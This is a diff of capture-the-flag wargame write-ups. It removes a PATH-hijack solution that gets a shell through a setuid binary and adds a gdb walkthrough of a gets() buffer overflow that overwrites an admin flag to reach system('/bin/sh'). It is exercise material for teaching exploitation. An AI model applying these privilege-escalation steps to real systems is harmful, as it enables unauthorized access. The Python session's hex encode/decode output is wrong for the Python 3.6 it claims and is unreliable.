@@ -1,30 +1,158 @@
-In this level you had to exploit the fact, that if no absolute path is specified,
-the system searches in the $PATH locations for it. Because the setuid binary
-didn't use absoliute paths, it was possible to change the environment $PATH
-variable. One of the first commands executed is `uname`. So we use a symlink
-called uname to `/bin/sh`.
+The inspiration for this level comes from the first level of exploit-exercises.com/protostar [0]
 
-    ln -s /bin/sh uname
+The issue is, that there is only a buffer that is 64byte wide, but gets() can read a lot of more characters and
+tries to store them in the buffer:
 
-If we now set $PATH only to the current working directory "." the system will
-search for the `uname` program and will only find the symlink. So it will execute
-the shell for us.
+    char buffer[64];
+    gets(buffer);
 
-    level4@gracker:/tmp/level4$ echo $PATH
-    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+If you look at the manpage of gets, you will read the following (`man gets`):
 
-    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
-    Zero Cool - Linux Information Gathering Tool v1.2
+  BUGS
+       Never  use  gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,
+       and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been
+       used to break computer security.
+                                                               ┌──────────────────────────────────────┐
+                                                               │ #include <stdlib.h>                  │
+                                                               │ #include <unistd.h>                  │
+                                                               │ #include <stdio.h>                   │
+   So this is what happens here too. Let's have a look at      │                                      │
+   the disassembly and compare it with the sourcecode.         │ void spawn_shell() {                 │
+   Here you can see the assembly code matched up with the      │     gid_t gid;                       │
+   C code. Especially interesting is the `admin_enabled`       │     uid_t uid;                       │
+   variable. You can see it's actually stored on the           │     gid = getegid();                 │
+   stack (rbp-0x4). And above that is the buffer. So when      │     uid = geteuid();                 │
+   the gets() call reads the input, it will happily write      │     setresgid(gid, gid, gid);        │
+   over everything on the stack.                               │     setresuid(uid, uid, uid);        │
+                                                               │     system("/bin/sh");               │
+                                                               │ }                                    │
+ ┌─────────────────────────────────────────────────────────────┤                                      │
+ │ 0x0000000000400718 <+0>:     push   rbp                     │ int main(int argc, char **argv)      │
+ │ 0x0000000000400719 <+1>:     mov    rbp,rsp                 │ {                                    │
+ │ 0x000000000040071c <+4>:     sub    rsp,0x60                │   volatile int admin_enabled;        │
+ │ 0x0000000000400720 <+8>:     mov    DWORD PTR [rbp-0x54],edi│   char buffer[64];                   │
+ │ 0x0000000000400723 <+11>:    mov    QWORD PTR [rbp-0x60],rsi│                                      │
+ │ 0x0000000000400727 <+15>:    mov    DWORD PTR [rbp-0x4],0x0 │   admin_enabled = 0;                 │
+ │ 0x000000000040072e <+22>:    mov    edi,0x400800            │                                      │
+ │ 0x0000000000400733 <+27>:    call   0x400540 <puts@plt>     │   printf("Zero Cool - Bugdoor ..."); │
+ │ 0x0000000000400738 <+32>:    lea    rax,[rbp-0x50]          │                                      │
+ │ 0x000000000040073c <+36>:    mov    rdi,rax                 │                                      │
+ │ 0x000000000040073f <+39>:    call   0x4005b0 <gets@plt>     │   gets(buffer);                      │
+ │ 0x0000000000400744 <+44>:    mov    eax,DWORD PTR [rbp-0x4] │                                      │
+ │ 0x0000000000400747 <+47>:    test   eax,eax                 │   if(admin_enabled != 0) {           │
+ │ 0x0000000000400749 <+49>:    je     0x400761 <main+73>      │                                      │
+ │ 0x000000000040074b <+51>:    mov    edi,0x400828            │                                      │
+ │ 0x0000000000400750 <+56>:    call   0x400540 <puts@plt>     │       printf("How can this ...");    │
+ │ 0x0000000000400755 <+61>:    mov    eax,0x0                 │                                      │
+ │ 0x000000000040075a <+66>:    call   0x4006c6 <spawn_shell>  │       spawn_shell();                 │
+ │ 0x000000000040075f <+71>:    jmp    0x40076b <main+83>      │   } else {                           │
+ │ 0x0000000000400761 <+73>:    mov    edi,0x400891            │                                      │
+ │ 0x0000000000400766 <+78>:    call   0x400540 <puts@plt>     │       printf("Trololol ...");        │
+ │ 0x000000000040076b <+83>:    leave                          │   }                                  │
+ └─────────────────────────────────────────────────────────────┴──────────────────────────────────────┘
 
-    [*] Get system information:
-    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
-    $ id
-    uid=1005(level5) gid=1004(level4) groups=1004(level4)
+Now let's debug this with gdb:
 
-Because the $PATH is now screwed, we have to reset it back to the original value,
-otherwise no other commands will work.
+level3@gracker:/matrix/level3$ gdb level3
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0000000000400718 <+0>:     push   rbp
+   0x0000000000400719 <+1>:     mov    rbp,rsp
+   0x000000000040071c <+4>:     sub    rsp,0x60
+   0x0000000000400720 <+8>:     mov    DWORD PTR [rbp-0x54],edi
+   0x0000000000400723 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
+   0x0000000000400727 <+15>:    mov    DWORD PTR [rbp-0x4],0x0    ; this seems to be the location of the admin_enabled variable. Because it's set to 0.
+   0x000000000040072e <+22>:    mov    edi,0x400800
+   0x0000000000400733 <+27>:    call   0x400540 <puts@plt>
+   0x0000000000400738 <+32>:    lea    rax,[rbp-0x50]
+   0x000000000040073c <+36>:    mov    rdi,rax
+   0x000000000040073f <+39>:    call   0x4005b0 <gets@plt>
+   0x0000000000400744 <+44>:    mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000400747 <+47>:    test   eax,eax                    ; set breakpoint here. after the gets(), and the admin_enabled variable is loaded into eax
+   0x0000000000400749 <+49>:    je     0x400761 <main+73>
+   0x000000000040074b <+51>:    mov    edi,0x400828
+   0x0000000000400750 <+56>:    call   0x400540 <puts@plt>
+   0x0000000000400755 <+61>:    mov    eax,0x0
+   0x000000000040075a <+66>:    call   0x4006c6 <spawn_shell>
+   0x000000000040075f <+71>:    jmp    0x40076b <main+83>
+   0x0000000000400761 <+73>:    mov    edi,0x400891
+   0x0000000000400766 <+78>:    call   0x400540 <puts@plt>
+   0x000000000040076b <+83>:    leave
+   0x000000000040076c <+84>:    ret
+End of assembler dump.
+(gdb) break *0x0000000000400747
+Breakpoint 1 at 0x400747
+(gdb) r
+Starting program: /matrix/level3/level3
+Zero Cool - Bugdoor v4
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                             ; let's put in a bunch of A.
 
-This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
-but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
-Read this paper for more details:
-https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
+Breakpoint 1, 0x0000000000400747 in main ()
+(gdb) x/32x $rsp                                                   ; then we look at the stack after the input was placed in the buffer
+0x7fff97737820: 0x97737968  0x00007fff  0x412b44c0  0x00000001     ; all those 0x41 are our "A". The ascii character A has the value 65
+0x7fff97737830: 0x41414141  0x41414141  0x41414141  0x41414141     ; or 0x41 in hex. You can see all ascii values with `man ascii`
+0x7fff97737840: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fff97737850: 0x41414141  0x00004141  0x00000000  0x00000000
+0x7fff97737860: 0x00400770  0x00000000  0x004005d0  0x00000000
+0x7fff97737870: 0x97737960  0x00007fff  0x00000000  0x00000000
+0x7fff97737880: 0x00000000  0x00000000  0x40d0db45  0x00007fce
+0x7fff97737890: 0x00000000  0x00000000  0x97737968  0x00007fff
+(gdb) x $rbp-0x4                                                   ; read the admin_enabled variable
+0x7fff9773787c: 0x00000000
+(gdb) info register eax                                            ; just to make sure. This is admin_enabled loaded into eax for the test branch
+eax            0x0  0                                              ; but it's still 0.
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /matrix/level3/level3
+Zero Cool - Bugdoor v4                                             ; now let's restart and put in a bunch more
+Enter Password:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x0000000000400747 in main ()
+(gdb) x/32x $rsp                                                   ; stack looks very full with As
+0x7ffe1e40c2b0: 0x1e40c3f8  0x00007ffe  0xfbecb4c0  0x00000001
+0x7ffe1e40c2c0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c2d0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c2e0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c2f0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c300: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c310: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7ffe1e40c320: 0x41414141  0x41414141  0x41414141  0x41414141
+(gdb) x $rbp-0x4                                                   ; and it looks like that admin_enabled got overwritten with AAAA as well.
+0x7ffe1e40c30c: 0x41414141
+(gdb) info register eax                                            ; yup. eax is not 0 anymore.
+eax            0x41414141   1094795585
+(gdb)
+
+
+##########################################################################################
+
+Also python is a great tool to convert numbers, ascii characters, etc.
+Python is really great. Get used to it.
+
+level3@gracker:~$ python
+Python 3.6.0 (default, Jan 16 2017, 12:12:55)
+[GCC 6.3.1 20170109] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> ord('A')
+65
+>>> hex(ord('A'))
+'0x41'
+>>> hex(65)
+'0x41'
+>>> chr(65)
+'A'
+>>> chr(0x65)
+'e'
+>>> "AAAAAAAAAAAA".encode("hex")
+'414141414141414141414141'
+>>> "414141414141414141414141".decode("hex")
+'AAAAAAAAAAAA'
+>>>
+
+
+[0] https://exploit-exercises.com/protostar/stack0/
